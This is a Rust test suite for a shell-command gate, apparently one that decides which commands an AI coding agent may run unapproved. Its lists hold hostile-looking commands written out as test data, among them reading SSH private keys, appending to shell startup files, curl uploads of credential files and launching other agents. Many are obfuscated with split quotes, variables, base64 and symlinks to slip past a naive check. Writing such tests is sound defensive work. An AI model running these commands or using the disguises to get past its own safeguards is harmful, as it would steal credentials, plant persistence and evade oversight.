use super::*;
use crate::pathctx::{PathCtx, enter};
use proptest::prelude::*;

fn home() -> String {
    std::env::var("HOME").unwrap_or_else(|_| "/home/tester".into())
}

fn kind(command: &str) -> GateKind {
    let project = format!("{}/projects/gateprobe", home());
    let _ctx = enter(PathCtx { cwd: Some(project.clone()), root: Some(project), session_id: None });
    let explanation = crate::explain_with_coverage_at_level(command, None);
    gate_kind(command, &explanation, &|c| crate::is_safe_command(c), &|_| false)
}

const NOT_YET: &[&str] = &[
    "zzgatetool sync --dry-run", "zzgatetool build ./out", "git push --force origin main", "cat ./x | zzgatetool",
    "zzgatetool -m 'a note'", "zzgatetool i lodash@~4.17.0", "git clone git@github.com:o/r", "zzgatetool i pkg@1.2.3",
];

const BOUNDARY: &[&str] = &[
    "cat ~/.ssh/id_rsa", "echo x >> ~/.zshrc", "cp a ~/.local/bin/x", "echo x > ~/.claude/settings.json",
    "echo x > ~/.config/safe-chains.toml", "git diff --output=~/.zshrc", "zzgatetool --config=$HOME/.bashrc",
    "safe-chains config add zzgatetool", "safe-chains config grant ~/x", "safe-chains mcp", "claude -p hi", "zzgatetool > /dev/rdisk0",
    "zzgatetool /etc/sudoers", "echo hi > $(zzgen)",
];

/// Found by review: each hid a boundary from a word-by-word reading of the raw text.
const DISGUISED: &[&str] = &[
    "zzgatetool > ~/'.zshrc'", "zzgatetool > ~/.zsh\"\"rc", "zzgatetool > ~/.zsh\\rc", "zzgatetool > ~\"/.zshrc\"",
    "zzgatetool > ~/.local/b\"\"in/x", "zzgatetool > ~/.config/safe-chains.tom\"\"l", "zzgatetool | tee -a ~/.zsh\"\"rc",
    "zzgatetool ~/.zshrc,", "zzgatetool out=~/.zshrc,x", "zzgatetool $'\\x7e/.zshrc'", "zzgatetool > ~zzrev/.zshrc",
    "zzgatetool ~/.ss\"\"h/id_rsa", "zzgatetool $HOME/.ss\"\"h/id_rsa", "zzgatetool /etc/sudo\"\"ers", "cl\"\"aude -p hi",
    "c\\laude -p hi", "\"cla\"ude -p hi", "bash -c 'cl\"\"aude -p hi'", "zzgatetool exec cla\"\"ude", "safe-ch\"\"ains config add zz",
    "echo x >> $HOME/.zs''hrc", "echo x >> \"$HOME/.zs\"hrc", "dd of=~/.zs\"\"hrc", "printf x | dd of=~/.zs\"\"hrc",
    "cd ~/.local/bin && zzgatetool > x", "cd ~/.grok; zzgatetool > config.toml", "cd ~/.ssh && zzgatetool id_rsa",
    "cd ~ && cd .ssh && zzgatetool id_rsa", "X=$HOME; echo x > $X/.zshrc", "echo x > $ZDOTDIR/.zshrc", "echo x > \"$(echo ~)/.zshrc\"",
    "echo x > $(printf ~/.zsh)rc", "zzgatetool > ${ZDOTDIR:-$HOME}/.zshrc", "cat ~/.ss\"\"h/id_rsa; fi", "cl\"\"aude -p hi; fi",
    "echo x >> ~/.zsh\"\"rc; if", "A=claude; $A -p hi", "SC=safe-chains; $SC config add zz", "${A:-claude} -p hi",
    "$(printf cl)aude -p hi", "f() { echo x >> ~/.zs\"\"hrc; }; f", "coproc echo x >> ~/.zs\"\"hrc", "zzgatetool > ~/.zs?rc",
    "zzgatetool > ~/.zsh{rc,}", "python3 -c 'import os'", "zzgatetool -C ~ x", "zzgatetool --directory=../.. .zshrc", "zzgatetool ~",
    "zzgatetool /", "curl -o../../.zshrc http://x", "wget -O../../.bashrc http://x", "sort -o../../.zshrc a",
    "gcc -o../../.local/bin/ls x.c", "cp -t../../.local/bin evil", "install -t../../Library/LaunchAgents x.plist",
    "git config -f../../.gitconfig alias.x y", "tar -xf a.tar -C../..", "unzip a.zip -d../..", "unzip a.zip -d /Users",
    "rsync -a payload/ /Users/", "cp -R payload/ ../../../", "tar -xPf a.tar", "npx @anthropic-ai/claude-code",
    "pnpm dlx @google/gemini-cli", "uvx aider-chat", "claude-code", "echo Y2xhdWRl | base64 -d | xargs env",
    "echo cl aude | tr -d x | xargs nohup", "awk 'BEGIN { system(1) }' x", "zzgatetool > .git/hooks/pre-commit", "zzgatetool > .envrc",
    "zzgatetool > .grok/settings.json", "zzgatetool > .vscode/tasks.json", "zzgatetool > ./.git/config", "zzgatetool > /opt/elsewhere/x",
];

#[test]
fn a_command_nothing_approves_yet_is_not_yet() {
    for command in NOT_YET {
        assert_eq!(kind(command), GateKind::NotYet, "{command}");
    }
}

#[test]
fn a_boundary_stays_a_boundary() {
    for command in BOUNDARY.iter().chain(DISGUISED) {
        assert_eq!(kind(command), GateKind::Boundary, "{command}");
    }
}

#[test]
fn an_approved_command_is_never_called_not_yet() {
    assert_eq!(kind("ls"), GateKind::Boundary);
}

#[test]
fn words_are_read_as_the_shell_names_them() {
    let read = |text: &str| words(text).collect::<Vec<_>>();
    assert_eq!(read("--output=~/.zshrc"), ["--output", "~/.zshrc"]);
    assert_eq!(read(">>~/'.zsh'\"rc\","), ["~/.zshrc"]);
    assert_eq!(read("c\\la\"ude\";x|y"), ["claude", "x", "y"]);
}

/// Ways to spell `~/.zshrc`, `~/.ssh/id_rsa` and the rest so the shell reads the same name.
fn disguise(place: &str, how: usize, at: usize) -> String {
    let at = at % place.len().max(1);
    let (head, tail) = place.split_at(at);
    match how {
        0 => format!("{head}\"\"{tail}"),
        1 => format!("{head}''{tail}"),
        2 if !tail.is_empty() => format!("{head}\\{tail}"),
        3 => format!("'{place}'"),
        _ => place.to_string(),
    }
}

proptest! {
    #![proptest_config(ProptestConfig::with_cases(64))]

    #[test]
    fn one_boundary_segment_makes_the_whole_chain_a_boundary(
        a in prop::sample::select(NOT_YET),
        b in prop::sample::select(BOUNDARY),
        op in prop::sample::select(&["&&", ";", "||"][..]),
        boundary_first in any::<bool>(),
    ) {
        let chain = if boundary_first { format!("{b} {op} {a}") } else { format!("{a} {op} {b}") };
        prop_assert_eq!(kind(&chain), GateKind::Boundary, "{}", chain);
    }

    /// Metamorphic: quoting a boundary differently, or reaching it from a `cd`, names the same place.
    #[test]
    fn a_write_to_a_runs_later_place_is_a_boundary_whatever_the_command_or_spelling(
        name in "zz[a-z]{2,8}",
        place in prop::sample::select(&["~/.zshrc", "~/.bashrc", "~/.local/bin/x", "~/.claude/settings.json", "~/.grok/config.toml", "~/Library/LaunchAgents/x.plist", "~/.ssh/id_rsa"][..]),
        how in 0..5usize,
        at in 2..40usize,
        form in 0..5usize,
    ) {
        let spelled = disguise(place, how, at);
        let (dir, file) = place.rsplit_once('/').unwrap_or(("~", place));
        let command = match form {
            0 => format!("{name} > {spelled}"),
            1 => format!("{name} --out={spelled}"),
            2 => format!("{name} {spelled},"),
            3 => format!("cd {dir} && {name} > {file}"),
            _ => format!("{name} {spelled}"),
        };
        prop_assert_eq!(kind(&command), GateKind::Boundary, "{}", command);
    }

    /// Metamorphic: an agent's name, however quoted, is still the agent.
    #[test]
    fn an_agent_is_a_boundary_however_its_name_is_quoted(
        agent in prop::sample::select(&["claude", "codex", "gemini", "grok", "safe-chains"][..]),
        how in 0..5usize,
        at in 1..10usize,
        wrapped in any::<bool>(),
    ) {
        let spelled = disguise(agent, how, at);
        let command = if wrapped { format!("zzgatetool run {spelled} -p hi") } else { format!("{spelled} -p hi") };
        prop_assert_eq!(kind(&command), GateKind::Boundary, "{}", command);
    }
}

fn in_project<T>(root: String, body: impl FnOnce() -> T) -> T {
    let _ctx = enter(PathCtx { cwd: Some(root.clone()), root: Some(root), session_id: None });
    body()
}

fn in_gate_probe<T>(body: impl FnOnce() -> T) -> T {
    in_project(format!("{}/projects/gateprobe", home()), body)
}

fn segment(text: &str) -> GateKind {
    in_gate_probe(|| segment_kind(text, &|c| crate::is_safe_command(c), false))
}

#[test]
fn a_refused_segment_is_a_boundary_only_when_its_reason_is() {
    assert_eq!(segment("cat ~/.ssh/id_rsa"), GateKind::Boundary);
    assert_eq!(segment("jj -R ~/.claude log"), GateKind::NotYet);
}

#[test]
fn a_runs_later_place_is_a_boundary_unless_the_segment_only_reads_it() {
    assert_eq!(segment("tee ~/Library/LaunchAgents/x.plist"), GateKind::Boundary);
    assert_eq!(segment("cat ~/Library/LaunchAgents/x.plist"), GateKind::NotYet);
}

#[test]
fn only_credentials_devices_and_frozen_places_are_boundary_reasons() {
    let boundary = [
        ReachReason::Credential,
        ReachReason::OtherUsersHome,
        ReachReason::RawDevice,
        ReachReason::FrozenTrustFile,
        ReachReason::FrozenTrustRoot,
        ReachReason::FrozenSystemIntegrity,
        ReachReason::Unconfined,
    ];
    for reason in boundary {
        assert!(is_boundary_reason(reason), "{reason:?}");
    }
    for reason in [ReachReason::RepositorySnapshot, ReachReason::OutsideWorkspace, ReachReason::ForeignTemp] {
        assert!(!is_boundary_reason(reason), "{reason:?}");
    }
}

#[test]
fn a_command_reaches_a_boundary_when_an_operand_names_one() {
    in_gate_probe(|| {
        assert!(reaches_a_boundary("cat ~/.ssh/id_rsa"));
        assert!(!reaches_a_boundary("cat ./notes.txt"));
    });
}

#[test]
fn a_whole_command_that_cannot_be_read_is_a_boundary_though_its_refused_segment_can() {
    assert_eq!(kind("zzgatetool sync"), GateKind::NotYet);
    assert_eq!(kind("echo '*' && zzgatetool sync"), GateKind::Boundary);
}

#[test]
fn only_a_user_name_after_a_tilde_is_opaque() {
    assert!(!text_is_opaque("zzgatetool ~"));
    assert!(!text_is_opaque("zzgatetool ~/notes"));
    assert!(text_is_opaque("zzgatetool ~zzsomeone"));
}

#[test]
fn a_word_leaves_the_workspace_when_it_resolves_outside_it() {
    in_gate_probe(|| {
        assert!(leaves_the_workspace(".."));
        assert!(leaves_the_workspace("~"));
        assert!(!leaves_the_workspace("~/projects/gateprobe/notes"));
        assert!(!leaves_the_workspace("a/b"));
    });
}

#[test]
fn a_tilde_before_a_name_is_not_expanded_to_the_home_folder() {
    in_project(format!("{}x", home()), || {
        assert!(leaves_the_workspace("~x/y"));
    });
}

#[test]
fn a_protected_place_is_named_by_the_home_folder_and_by_a_protected_path() {
    in_gate_probe(|| {
        assert!(names_a_protected_place("~"));
        assert!(names_a_protected_place("~/.config/safe-chains.toml"));
        assert!(names_a_protected_place(&home()), "the home folder spelled out");
        assert!(names_a_protected_place(&format!("{}/", home())), "the home folder with a trailing slash");
        assert!(!names_a_protected_place("notes"));
    });
}

#[test]
fn an_approved_segment_that_cannot_be_read_makes_the_whole_command_a_boundary() {
    assert_eq!(kind("echo $X && zzgatetool sync"), GateKind::Boundary, "opaque, not outside the workspace");
    assert_eq!(kind("echo ../x && zzgatetool sync"), GateKind::Boundary, "outside the workspace, not opaque");
    assert_eq!(kind("echo ./x && zzgatetool sync"), GateKind::NotYet);
}

/// The gate of `command`, with the one refused segment's text replaced by `text`.
fn kind_of_refused_segment(command: &str, text: &str) -> GateKind {
    in_gate_probe(|| {
        let mut explanation = crate::explain_with_coverage_at_level(command, None);
        explanation.segments.truncate(1);
        explanation.segments[0].text = text.to_string();
        gate_kind(command, &explanation, &|_| false, &|_| false)
    })
}

#[test]
fn a_refused_segment_that_cannot_be_read_or_leaves_the_workspace_is_a_boundary_on_its_own() {
    assert_eq!(kind_of_refused_segment("zzgatetool sync", "zzgatetool sync"), GateKind::NotYet);
    assert_eq!(kind_of_refused_segment("zzgatetool sync", "zzgatetool $X"), GateKind::Boundary, "opaque only");
    assert_eq!(kind_of_refused_segment("zzgatetool sync", "zzgatetool ../x"), GateKind::Boundary, "outside the workspace only");
}

#[test]
fn each_spelling_of_a_place_outside_the_workspace_is_outside_on_its_own() {
    in_gate_probe(|| {
        for word in ["/opt/elsewhere/x", "~/elsewhere", "..", "../x", "../../x"] {
            assert!(leaves_the_workspace(word), "{word}");
        }
        for word in ["./x", "x/y", "../gateprobe/x"] {
            assert!(!leaves_the_workspace(word), "{word}");
        }
        for word in ["/etc/sudoers", "~", "~/.ssh", "~/.zshrc"] {
            assert!(names_a_protected_place(word), "{word}");
        }
        for word in ["/opt/elsewhere/x", "~/elsewhere", "x/y", "./x"] {
            assert!(!names_a_protected_place(word), "{word}");
        }
    });
}

#[test]
fn without_a_workspace_a_parent_path_is_read_as_written() {
    // No context to join it to, so `resolve` returns the relative spelling and it must still count.
    for word in ["..", "../x", "../../x"] {
        assert!(leaves_the_workspace(word), "{word}");
    }
    assert!(!leaves_the_workspace("./x"));
}

#[test]
fn a_segment_that_runs_an_agent_is_a_boundary_whatever_the_rest_of_the_command_says() {
    assert_eq!(segment("gptme hi"), GateKind::Boundary);
    assert_eq!(segment("zzgatetool sync"), GateKind::NotYet);
}

#[test]
fn an_option_value_attached_to_a_directory_flag_is_opaque() {
    assert!(text_is_opaque("zzgatetool -Csomewhere x"));
    assert!(!text_is_opaque("zzgatetool -D x"));
}

#[test]
fn a_relative_path_is_read_against_the_workspace_before_it_is_called_protected() {
    in_gate_probe(|| {
        assert!(names_a_protected_place("sub/../../../.ssh/id_rsa"), "a slash without a leading dot");
        assert!(!names_a_protected_place("sub/../notes"));
    });
    in_project(format!("{}/.ssh/work", home()), || {
        assert!(names_a_protected_place(".."), "a leading dot without a slash");
    });
}

/// A workspace holding committed links: `key` and `id.pem` to a credential, `rc` to a login file,
/// `out` to a system folder, `inner` to a file of its own, `elsewhere` to another temporary folder,
/// and a plain folder `sub`.
fn in_linked_workspace(body: impl FnOnce(&str)) {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path().to_string_lossy().into_owned();
    std::fs::write(dir.path().join("a.txt"), "").expect("write");
    std::fs::create_dir(dir.path().join("sub")).expect("mkdir");
    let other = tempfile::tempdir_in("/tmp").expect("tempdir");
    std::fs::write(other.path().join("f"), "").expect("write");
    for (name, target) in [
        ("key", format!("{}/.ssh/id_rsa", home())),
        ("id.pem", format!("{}/.ssh/id_rsa", home())),
        ("rc", format!("{}/.zshrc", home())),
        ("out", "/etc".to_string()),
        ("inner", "a.txt".to_string()),
        ("elsewhere", other.path().join("f").to_string_lossy().into_owned()),
    ] {
        std::os::unix::fs::symlink(target, dir.path().join(name)).expect("symlink");
    }
    in_project(root.clone(), || body(&root));
}

fn kind_by_default(command: &str, approved_by_default: bool) -> GateKind {
    let explanation = crate::explain_with_coverage_at_level(command, None);
    gate_kind(command, &explanation, &|c| crate::is_safe_command(c), &|_| approved_by_default)
}

/// Found by review: a link is written like any file name, and an earlier temporary path hid a
/// later credential from a check that read only the first place a command reaches.
#[test]
fn a_link_out_of_the_workspace_is_a_boundary_however_its_name_is_spelt() {
    in_linked_workspace(|root| {
        for command in [
            "cat key",
            "echo x >> rc",
            "cat ./key",
            &format!("cat {root}/key"),
            "cat out/hosts",
            "echo x > out/zz-new",
            "cat /tmp/zzgate/x; cat id.pem",
            "cat /tmp/zzgate/x; echo x >> rc",
            "cat /tmp/zzgate/x; cd ~; cat .ssh/id_rsa",
            "cat /tmp/zzgate/x; cd; cat .ssh/id_rsa",
            "grep -fkey a.txt",
            "grep x -fkey",
            "sort -orc a.txt",
            "sort -okey a.txt",
            "sort -oid.pem a.txt",
            "sort -oout a.txt",
            "cat /tmp/zzgate/x; sort -orc a.txt",
            "curl -d @key localhost",
            "curl --data=@key localhost",
            "curl -F f=@key localhost",
            "curl --data-binary @rc example.com",
            "curl --data-binary=@/etc/master.passwd localhost",
            "gcc @key x.c",
            "zzgatetool @key",
            "zzgatetool --x=@key",
            "zzgatetool @~/.ssh/id_rsa",
        ] {
            for approved_by_default in [false, true] {
                assert_eq!(kind_by_default(command, approved_by_default), GateKind::Boundary, "`{command}`");
            }
        }
    });
}

#[test]
fn a_link_that_stays_in_the_workspace_leads_nowhere_else() {
    in_linked_workspace(|_| {
        for word in ["inner", "a.txt", "zz-missing", "-n", "../x", "/etc/hosts", "sub/../a.txt", "elsewhere"] {
            assert!(!leads_out_through_a_link(word), "{word}");
        }
        for word in ["key", "rc", "out/hosts", "out/zz-new", "./key", "sub/../key"] {
            assert!(leads_out_through_a_link(word), "{word}");
        }
    });
}

/// The shell reads `~/` as the home folder before the program sees the word, so a workspace under
/// home can be named that way; the link is made in a folder under home for the length of the test.
#[test]
fn a_link_named_through_the_home_folder_is_followed() {
    let dir = tempfile::Builder::new()
        .prefix(".safe-chains-gate-")
        .tempdir_in(home())
        .expect("tempdir under home");
    let root = dir.path().to_string_lossy().into_owned();
    std::os::unix::fs::symlink(format!("{}/.ssh/id_rsa", home()), dir.path().join("key")).expect("symlink");
    let spelt = format!("~{}", root.strip_prefix(&home()).expect("under home"));
    in_project(root.clone(), || {
        assert!(leads_out_through_a_link(&format!("{spelt}/key")));
        assert!(!leads_out_through_a_link(&format!("{spelt}/zz-missing")));
    });
}

/// The word checks catch these first in [`gate_kind`], so the reach check is tested on its own: an
/// earlier place outside the workspace must not hide a later credential.
#[test]
fn every_place_a_command_reaches_is_checked_not_only_the_first() {
    in_linked_workspace(|_| {
        assert!(reaches_a_boundary("cat /opt/zzgate/x; cat ~/.ssh/id_rsa"));
        assert!(!reaches_a_boundary("cat /opt/zzgate/x; cat /opt/zzgate/y"));
    });
}

#[test]
fn a_home_path_after_an_at_is_a_path_part_and_a_version_range_is_not() {
    assert!(path_parts("@~/.ssh/id_rsa").any(|part| part == "~/.ssh/id_rsa"));
    assert!(path_parts("--data=@key").any(|part| part == "key"));
    assert!(!path_parts("lodash@~4.17.0").any(|part| part.starts_with('~')));
}
